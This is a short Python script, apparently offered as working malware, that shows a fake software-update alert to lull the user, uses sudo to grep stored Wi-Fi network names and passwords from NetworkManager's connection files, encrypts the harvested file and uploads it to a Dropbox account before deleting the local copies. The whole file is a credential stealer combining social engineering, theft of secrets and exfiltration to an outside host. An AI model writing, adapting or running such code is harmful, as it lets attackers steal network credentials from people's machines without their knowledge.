#coded by:letzcode97
import os
import time
import pyautogui
import subprocess
import pyAesCrypt
import dropbox

localtime_infection = time.asctime( time.localtime(time.time()) )   #starting infection time

def wait_social_engineering():
    time.sleep(2)                                 #waiting for removing suspicion
    pyautogui.alert('New software update available. A terminal will be opened soon.')   #alert window displayed in screeen
    time.sleep(2)


def wifi_password():
    pyautogui.typewrite("sudo apt-get update")     #terminal opened and command is typed automatically
    time.sleep(1)
    os.system("sudo apt-get update")               #command processed in background
    os.chdir("/etc/NetworkManager/system-connections")  #changing to requird location where wifi_password is stored
    u=subprocess.check_output("sudo grep 'psk=' *",shell=True)  #using grep to get passwords and network names
    u_decode=u.decode("utf-8")                               #converting all the result to plain text format
    os.chdir("/tmp")
    new_file=open("word1.txt","w+")                          #creating a file for writing
    new_file.write(u_decode)                                 #wifi_password and networks wriiten into the file
    new_file.close()

def encrypt():                  #encrypting the file to which wifi_password saved
    os.chdir("/tmp")
    bufferSize = 64 * 1024
    password = "password"      #key is password(for this example)
    # encrypt
    pyAesCrypt.encryptFile("word1.txt", "word1.txt.aes", password, bufferSize)
    subprocess.call("rm word1.txt",shell=True)          #removing the original text file
    
def cleansing_dropbox():                               #uploading file to dropbox and removing the encrypt file
    encrypt_file=open("/tmp/word1.txt.aes")
    dropbox_object=dropbox.Dropbox("dropbox tocken")        #dropbox tocken
    with open("/tmp/word1.txt.aes", "rb") as f:
        dropbox_object.files_upload(f.read(), "/word1.txt.aes"+localtime_infection, mute = True)
    subprocess.call("rm word1.txt.aes",shell=True)


wait_social_engineering()
wifi_password()
encrypt()
cleansing_dropbox()
